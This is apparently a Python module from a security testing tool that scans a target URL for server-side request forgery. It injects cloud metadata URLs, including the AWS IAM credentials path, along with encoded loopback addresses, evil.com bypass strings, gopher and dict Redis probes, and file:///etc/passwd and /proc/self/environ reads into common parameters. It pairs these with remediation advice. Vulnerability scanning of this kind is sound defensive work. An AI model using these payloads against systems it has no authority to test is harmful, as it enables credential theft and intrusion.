"""SSRF Scanner — blind, cloud metadata, protocol handlers, bypass techniques."""
from __future__ import annotations
import asyncio
import urllib.parse
from typing import Any
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.payload_engine import PayloadEngine
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)

CLOUD_METADATA = [
    ("AWS IMDSv1", "http://169.254.169.254/latest/meta-data/"),
    ("AWS IMDSv1 IAM", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("GCP Metadata", "http://metadata.google.internal/computeMetadata/v1/?recursive=true"),
    ("Azure IMDS", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
    ("DigitalOcean", "http://169.254.169.254/metadata/v1/"),
    ("Alibaba Cloud", "http://100.100.100.200/latest/meta-data/"),
]

INTERNAL_TARGETS = [
    "http://localhost/",
    "http://127.0.0.1/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://2130706433/",   # decimal 127.0.0.1
    "http://0x7f000001/",   # hex 127.0.0.1
    "http://0177.0.0.1/",   # octal 127.0.0.1
    "http://127.1/",
    "http://127.000.000.001/",
]

BYPASS_VARIATIONS = [
    "http://localhost@evil.com/",
    "http://127.0.0.1#@evil.com/",
    "http://evil.com@127.0.0.1/",
    "http://localhost%09.evil.com/",
    "http://127.0.0.1%00.evil.com/",
    "http://LocalHost/",
    "http://LOCALHOST/",
    "http://127.0.0.1:80/",
    "http://[0:0:0:0:0:ffff:127.0.0.1]/",
    "http://[::ffff:127.0.0.1]/",
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:6379/_INFO",
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///proc/self/environ",
    "ldap://127.0.0.1:389/",
    "sftp://127.0.0.1:22/",
]

COMMON_SSRF_PARAMS = [
    "url", "uri", "path", "dest", "destination", "redirect", "redirect_uri",
    "redirect_url", "next", "host", "site", "html", "reference", "ref",
    "link", "src", "load", "fetch", "image", "img", "proxy", "feed",
    "open", "to", "out", "view", "page", "from", "return", "returnTo",
    "return_to", "callback", "callback_url", "data", "window", "jump",
    "service", "target", "u", "r", "filepath", "endpoint", "file",
]

async def _test_ssrf_param(
    base_url: str,
    param: str,
    payloads: list[str],
    client: TalismanHTTPClient,
) -> list[dict[str, Any]]:
    findings: list[dict[str, Any]] = []
    parsed = urllib.parse.urlparse(base_url)
    existing_params = dict(urllib.parse.parse_qsl(parsed.query))

    for payload in payloads[:15]:
        try:
            test_params = {**existing_params, param: payload}
            test_url = parsed._replace(query=urllib.parse.urlencode(test_params)).geturl()
            r = await client.get(test_url, timeout=10)
            # Detect successful SSRF response indicators
            indicators = [
                ("ami-", "AWS AMI ID in response — cloud metadata access"),
                ("169.254", "Internal metadata IP in response"),
                ("iam/security-credentials", "IAM credential path in response"),
                ("computeMetadata", "GCP metadata in response"),
                ("root:x:", "Linux /etc/passwd content in response"),
                ("localhost", "localhost reference in response"),
                ("127.0.0.1", "loopback IP in response"),
                ("+OK", "Redis/SMTP response"),
                ("$REDIS_VERSION", "Redis version in response"),
                ("Server: nginx", "Internal nginx response"),
                ("Server: Apache", "Internal Apache response"),
            ]
            for indicator, desc in indicators:
                if indicator in r.text:
                    findings.append({
                        "param": param,
                        "payload": payload,
                        "indicator": indicator,
                        "description": desc,
                        "response_snippet": r.text[:500],
                        "request": f"GET {test_url} HTTP/1.1",
                        "status": r.status_code,
                    })
                    return findings  # confirmed, stop testing this param
        except Exception as e:
            log.debug("ssrf_param_test", param=param, payload=payload[:30], error=str(e))
    return findings

async def run(
    target: str,
    session: Any = None,
    scope: Any = None,
    rate_limiter: Any = None,
    proxy: str | None = None,
    oast_domain: str | None = None,
    **kwargs: Any,
) -> dict[str, Any]:
    url = target if "://" in target else f"https://{target}"
    console.print(f"\n[module]⚡ SSRF Scanner[/module] → [target]{url}[/target]")
    findings: list[dict[str, Any]] = []

    all_payloads = [m[1] for m in CLOUD_METADATA] + INTERNAL_TARGETS + BYPASS_VARIATIONS
    if oast_domain:
        all_payloads = [f"http://{oast_domain}/", f"https://{oast_domain}/"] + all_payloads

    parsed = urllib.parse.urlparse(url)
    existing_params = list(dict(urllib.parse.parse_qsl(parsed.query)).keys())
    params_to_test = list(set(existing_params + COMMON_SSRF_PARAMS[:10]))

    async with TalismanHTTPClient(proxy=proxy, timeout=12) as client:
        tasks = [
            _test_ssrf_param(url, param, all_payloads, client)
            for param in params_to_test
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for result in results:
            if isinstance(result, list):
                for finding in result:
                    severity = "critical"
                    title = f"SSRF — parameter '{finding['param']}' — {finding['description']}"
                    print_finding(title, severity, url)
                    findings.append(finding)
                    if session:
                        await session.add_finding(
                            target=url, module="ssrf", vuln_type="ssrf",
                            severity=severity, confidence="confirmed",
                            title=title,
                            description=f"Server-Side Request Forgery confirmed. "
                                        f"Parameter '{finding['param']}' made a server-side request "
                                        f"to '{finding['payload']}'. Evidence: {finding['description']}",
                            request=finding["request"],
                            response=finding.get("response_snippet", ""),
                            evidence=finding["indicator"],
                            reproduction=f"Set parameter '{finding['param']}' to: {finding['payload']}",
                            remediation=(
                                "1. Validate and allowlist URLs — never allow arbitrary user-supplied URLs.\n"
                                "2. Block requests to internal IP ranges (RFC 1918) and metadata endpoints.\n"
                                "3. Disable unused protocol handlers (file://, gopher://, dict://).\n"
                                "4. Use a dedicated HTTP client with strict output parsing."
                            ),
                            cvss_score=9.8, cwe="CWE-918",
                            references=[
                                "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/",
                                "https://portswigger.net/web-security/ssrf",
                            ],
                        )

    console.print(f"  Found {len(findings)} SSRF vulnerabilities")
    return {"target": url, "findings": findings, "count": len(findings)}
